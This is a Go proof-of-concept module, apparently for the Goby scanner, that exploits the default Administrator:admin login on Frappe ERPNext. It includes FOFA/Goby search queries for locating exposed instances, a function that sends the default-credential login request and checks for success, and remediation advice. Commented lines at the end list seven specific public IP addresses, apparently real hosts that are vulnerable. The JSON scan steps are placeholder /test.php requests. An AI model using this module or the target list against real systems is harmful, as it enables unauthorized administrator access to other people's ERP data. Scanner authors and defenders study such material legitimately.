package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ERPNext Default Password",
    "Description": "<p>Frappe ERPNext is an open source ERP (enterprise resource planning) system. The default password Administrator:admin exists in the Frappe ERPNext.</p><p>An attacker can control the entire platform through the default password vulnerability, and operate the core functions with administrator privileges.</p>",
    "Product": "erpnex",
    "Homepage": "https://erpnext.com/",
    "DisclosureDate": "2023-02-22",
    "Author": "635477622@qq.com",
    "FofaQuery": "(body=\"ERPNext\" && (title=\"Login\" || header=\"Set-Cookie: system_user=\")) || body=\"src=\\\"/assets/erpnext/dist/js/erpnext-web.bundle.VAACRQHC.js\" || header=\"/assets/erpnext/zuse/css/site.css\" || header=\"/assets/erpnext/day/assets/vendor/\" || header=\"/assets/erpnext/dist/js/erpnext\" || banner=\"erpnext-web.bundle.js\" || header=\"erpnext-web.bundle.js\" || banner=\"/assets/erpnext/dist/js/erpnext\" || banner=\"/assets/js/erpnext-web.min.js\" || header=\"/assets/js/erpnext-web.min.js\" || body=\"href=\\\"/assets/css/erpnext-web.css\" || body=\"src=\\\"/assets/js/erpnext-web.min.js\"",
    "GobyQuery": "(body=\"ERPNext\" && (title=\"Login\" || header=\"Set-Cookie: system_user=\")) || body=\"src=\\\"/assets/erpnext/dist/js/erpnext-web.bundle.VAACRQHC.js\" || header=\"/assets/erpnext/zuse/css/site.css\" || header=\"/assets/erpnext/day/assets/vendor/\" || header=\"/assets/erpnext/dist/js/erpnext\" || banner=\"erpnext-web.bundle.js\" || header=\"erpnext-web.bundle.js\" || banner=\"/assets/erpnext/dist/js/erpnext\" || banner=\"/assets/js/erpnext-web.min.js\" || header=\"/assets/js/erpnext-web.min.js\" || body=\"href=\\\"/assets/css/erpnext-web.css\" || body=\"src=\\\"/assets/js/erpnext-web.min.js\"",
    "Level": "1",
    "Impact": "<p>An attacker can control the entire platform through the default password vulnerability, and operate the core functions with administrator privileges.</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, special characters, and more than 8 digits.</p><p>2. If not necessary, the public network is prohibited from accessing the system.</p><p>3. Set access policy and whitelist access through firewall and other security devices.</p>",
    "References": [
        "https://github.com/frappe/erpnext"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Frappe ERPNext 企业资源计划系统默认口令",
            "Product": "ERPNext",
            "Description": "<p>Frappe&nbsp;ERPNext 是一套开源的ERP（企业资源计划）系统。Frappe&nbsp;ERPNext 存在默认口令&nbsp;Administrator:admin<br></p><p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。</p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p>攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "ERPNext Default Password",
            "Product": "erpnex",
            "Description": "<p>Frappe ERPNext is an open source ERP (enterprise resource planning) system.&nbsp;The default password Administrator:admin exists in the Frappe ERPNext.</p><p>An attacker can control the entire platform through the default password vulnerability, and operate the core functions with administrator privileges.</p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers, special characters, and more than 8 digits.</p><p>2. If not necessary, the public network is prohibited from accessing the system.</p><p>3. Set access policy and whitelist access through firewall and other security devices.</p>",
            "Impact": "<p>An attacker can control the entire platform through the default password vulnerability, and operate the core functions with administrator privileges.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "9935"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {

			uri := "/"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfg.FollowRedirect = true
			cfg.VerifyTls = false

			cfg.Data = "cmd=login&usr=Administrator&pwd=admin&device=desktop"
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return strings.Contains(resp.Utf8Html, "\"message\":\"Logged In\",")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			expResult.Output = "use \"Administrator:admin\" to login the system\n"
			expResult.Success = true
			return expResult
		},
	))
}

//http://159.223.174.134:8080
//http://139.180.188.37
//http://143.244.149.231
//http://129.211.94.239
//https://172.104.42.174
//https://103.99.202.105
//https://74.208.22.21
